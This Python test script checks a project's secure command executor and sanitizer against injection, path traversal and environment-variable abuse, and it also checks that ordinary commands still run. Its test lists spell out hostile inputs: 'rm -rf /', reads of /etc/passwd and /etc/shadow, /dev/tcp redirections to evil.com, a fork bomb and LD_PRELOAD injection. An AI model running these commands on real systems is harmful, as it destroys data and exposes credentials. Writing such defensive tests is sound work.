#!/usr/bin/env python3
"""
Test script to validate command injection fixes in the CODE project.

Tests the secure command execution implementation against various
command injection attacks and validates that legitimate commands
still work properly.
"""

import asyncio
import sys
import os
from pathlib import Path
from typing import List, Dict, Any, Tuple
import json
from datetime import datetime

# Add src to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "src"))

from src.core.secure_command_executor import SecureCommandExecutor, CommandCategory
from src.core.command_sanitizer import CommandSanitizer
from src.core.exceptions import ValidationError, CommandExecutionError, SecurityError


class CommandInjectionTester:
    """Test various command injection scenarios."""
    
    def __init__(self):
        """Initialize tester."""
        self.executor = SecureCommandExecutor(
            working_directory=Path.cwd(),
            enable_sandbox=True
        )
        self.test_results: List[Dict[str, Any]] = []
        self.passed = 0
        self.failed = 0
    
    async def run_all_tests(self):
        """Run all security tests."""
        print("🔒 Testing Command Injection Fixes\n")
        print("=" * 80)
        
        # Test injection prevention
        await self.test_command_injection_prevention()
        
        # Test path traversal prevention
        await self.test_path_traversal_prevention()
        
        # Test input sanitization
        await self.test_input_sanitization()
        
        # Test legitimate commands
        await self.test_legitimate_commands()
        
        # Test resource limits
        await self.test_resource_limits()
        
        # Print summary
        self.print_summary()
    
    async def test_command_injection_prevention(self):
        """Test that command injection attempts are blocked."""
        print("\n📌 Testing Command Injection Prevention")
        print("-" * 40)
        
        injection_attempts = [
            # Command chaining
            ("ls; rm -rf /", "Command chaining with semicolon"),
            ("ls && cat /etc/passwd", "Command chaining with &&"),
            ("ls || cat /etc/shadow", "Command chaining with ||"),
            ("ls | grep secret", "Command piping"),
            
            # Command substitution
            ("echo $(cat /etc/passwd)", "Command substitution with $()"),
            ("echo `cat /etc/passwd`", "Command substitution with backticks"),
            ("echo ${PATH}", "Variable expansion"),
            
            # Redirection abuse
            ("ls > /dev/tcp/evil.com/80", "Network redirection"),
            ("cat < /dev/tcp/evil.com/80", "Network input"),
            
            # Path traversal in commands
            ("cat ../../../../etc/passwd", "Path traversal"),
            ("ls ../..", "Parent directory access"),
            
            # Shell execution
            ("sh -c 'cat /etc/passwd'", "Shell execution"),
            ("bash -c 'rm -rf /'", "Bash execution"),
            ("python -e 'import os; os.system(\"cat /etc/passwd\")'", "Python eval"),
            
            # Dangerous commands
            ("rm -rf /", "Recursive deletion"),
            (":(){ :|:& };:", "Fork bomb"),
            
            # Environment manipulation
            ("LD_PRELOAD=/tmp/evil.so ls", "LD_PRELOAD injection"),
            ("PATH=/tmp:$PATH ls", "PATH manipulation"),
        ]
        
        for command, description in injection_attempts:
            result = await self.test_single_injection(command, description)
            self.test_results.append(result)
    
    async def test_single_injection(self, command: str, description: str) -> Dict[str, Any]:
        """Test a single injection attempt."""
        try:
            # This should fail with validation error
            result = await self.executor.execute_async(command)
            
            # If we get here, the injection was NOT blocked (bad!)
            print(f"❌ FAILED: {description}")
            print(f"   Command: {command}")
            print(f"   ERROR: Command was executed when it should have been blocked!")
            self.failed += 1
            
            return {
                "test": description,
                "command": command,
                "passed": False,
                "error": "Command was not blocked"
            }
            
        except (ValidationError, CommandExecutionError, SecurityError) as e:
            # Good! The injection was blocked
            print(f"✅ PASSED: {description}")
            print(f"   Command: {command}")
            print(f"   Blocked: {str(e)}")
            self.passed += 1
            
            return {
                "test": description,
                "command": command,
                "passed": True,
                "blocked_reason": str(e)
            }
    
    async def test_path_traversal_prevention(self):
        """Test path traversal prevention in file operations."""
        print("\n📌 Testing Path Traversal Prevention")
        print("-" * 40)
        
        traversal_attempts = [
            ("../../../etc/passwd", "Basic path traversal"),
            ("/etc/passwd", "Absolute path to system file"),
            ("~/../../../etc/shadow", "Home directory traversal"),
            ("./foo/../../bar/../../../etc/hosts", "Complex traversal"),
            ("%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL encoded traversal"),
            ("..\\..\\..\\windows\\system32", "Windows-style traversal"),
        ]
        
        for path, description in traversal_attempts:
            try:
                # Test path sanitization
                sanitized = CommandSanitizer.sanitize_path(
                    path,
                    base_dir=Path.cwd(),
                    allow_relative=True,
                    must_exist=False,
                    allow_symlinks=False
                )
                
                # Check if path escapes base directory
                if not str(sanitized).startswith(str(Path.cwd())):
                    print(f"❌ FAILED: {description}")
                    print(f"   Path: {path}")
                    print(f"   Sanitized to: {sanitized} (outside base dir)")
                    self.failed += 1
                else:
                    print(f"✅ PASSED: {description}")
                    print(f"   Path: {path}")
                    print(f"   Sanitized to: {sanitized}")
                    self.passed += 1
                    
            except (ValidationError, SecurityError) as e:
                # Good! Path was rejected
                print(f"✅ PASSED: {description}")
                print(f"   Path: {path}")
                print(f"   Blocked: {str(e)}")
                self.passed += 1
    
    async def test_input_sanitization(self):
        """Test input sanitization."""
        print("\n📌 Testing Input Sanitization")
        print("-" * 40)
        
        # Test command argument sanitization
        test_args = [
            (["ls", "-la"], "Simple arguments"),
            (["echo", "hello world"], "Arguments with spaces"),
            (["echo", "hello; rm -rf /"], "Argument with injection"),
            (["cat", "file with spaces.txt"], "Filename with spaces"),
            (["grep", "pattern", "*.txt"], "Glob patterns"),
        ]
        
        for args, description in test_args:
            try:
                sanitized = CommandSanitizer.sanitize_command_args(args)
                print(f"✅ PASSED: {description}")
                print(f"   Original: {args}")
                print(f"   Sanitized: {sanitized}")
                self.passed += 1
            except Exception as e:
                print(f"❌ FAILED: {description}")
                print(f"   Args: {args}")
                print(f"   Error: {str(e)}")
                self.failed += 1
        
        # Test environment variable sanitization
        env_vars = [
            ("PATH", "/usr/bin:/bin", "Normal PATH"),
            ("EVIL_VAR", "$(cat /etc/passwd)", "Command substitution in value"),
            ("LD_PRELOAD", "/tmp/evil.so", "Dangerous variable"),
            ("123INVALID", "value", "Invalid variable name"),
        ]
        
        print("\n📌 Testing Environment Variable Sanitization")
        print("-" * 40)
        
        for name, value, description in env_vars:
            try:
                san_name, san_value = CommandSanitizer.sanitize_environment_var(name, value)
                print(f"✅ PASSED: {description}")
                print(f"   Original: {name}={value}")
                print(f"   Sanitized: {san_name}={san_value}")
                self.passed += 1
            except ValidationError as e:
                print(f"✅ PASSED: {description} (correctly rejected)")
                print(f"   Variable: {name}={value}")
                print(f"   Rejected: {str(e)}")
                self.passed += 1
    
    async def test_legitimate_commands(self):
        """Test that legitimate commands still work."""
        print("\n📌 Testing Legitimate Commands")
        print("-" * 40)
        
        legitimate_commands = [
            ("echo 'Hello, World!'", "Simple echo"),
            ("ls -la", "List files"),
            ("pwd", "Print working directory"),
            ("date", "Show date"),
            ("python --version", "Python version"),
            ("git status", "Git status"),
            ("make --version", "Make version"),
        ]
        
        for command, description in legitimate_commands:
            try:
                result = await self.executor.execute_async(
                    command,
                    timeout=5.0
                )
                
                if result.success:
                    print(f"✅ PASSED: {description}")
                    print(f"   Command: {command}")
                    print(f"   Output: {result.stdout.strip()[:50]}...")
                    self.passed += 1
                else:
                    print(f"⚠️  WARNING: {description}")
                    print(f"   Command: {command}")
                    print(f"   Exit code: {result.exit_code}")
                    print(f"   Error: {result.stderr.strip()}")
                    
            except Exception as e:
                print(f"❌ FAILED: {description}")
                print(f"   Command: {command}")
                print(f"   Error: {str(e)}")
                self.failed += 1
    
    async def test_resource_limits(self):
        """Test resource limiting."""
        print("\n📌 Testing Resource Limits")
        print("-" * 40)
        
        # Test timeout
        try:
            print("Testing command timeout...")
            result = await self.executor.execute_async(
                "sleep 10",
                timeout=2.0
            )
            print("❌ FAILED: Timeout test - command should have timed out")
            self.failed += 1
        except Exception as e:
            if "timeout" in str(e).lower():
                print("✅ PASSED: Command properly timed out")
                self.passed += 1
            else:
                print(f"❌ FAILED: Unexpected error: {e}")
                self.failed += 1
        
        # Test output size limit
        try:
            print("\nTesting output size limit...")
            # Try to generate large output
            result = await self.executor.execute_async(
                "python -c 'print(\"A\" * 20000000)'",  # 20MB of output
                timeout=5.0
            )
            
            if result.truncated:
                print("✅ PASSED: Output properly truncated")
                self.passed += 1
            else:
                print("⚠️  WARNING: Large output was not truncated")
                
        except Exception as e:
            print(f"✅ PASSED: Large output rejected: {str(e)}")
            self.passed += 1
    
    def print_summary(self):
        """Print test summary."""
        print("\n" + "=" * 80)
        print("📊 TEST SUMMARY")
        print("=" * 80)
        
        total = self.passed + self.failed
        pass_rate = (self.passed / total * 100) if total > 0 else 0
        
        print(f"Total Tests: {total}")
        print(f"Passed: {self.passed} ✅")
        print(f"Failed: {self.failed} ❌")
        print(f"Pass Rate: {pass_rate:.1f}%")
        
        if self.failed == 0:
            print("\n🎉 All security tests passed! Command injection vulnerabilities are fixed.")
        else:
            print(f"\n⚠️  {self.failed} tests failed. Please review and fix the issues.")
        
        # Save results
        results_file = f"command_injection_test_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(results_file, 'w') as f:
            json.dump({
                "timestamp": datetime.now().isoformat(),
                "summary": {
                    "total": total,
                    "passed": self.passed,
                    "failed": self.failed,
                    "pass_rate": pass_rate
                },
                "test_results": self.test_results
            }, f, indent=2)
        
        print(f"\nDetailed results saved to: {results_file}")


async def main():
    """Run command injection tests."""
    tester = CommandInjectionTester()
    await tester.run_all_tests()


if __name__ == "__main__":
    asyncio.run(main())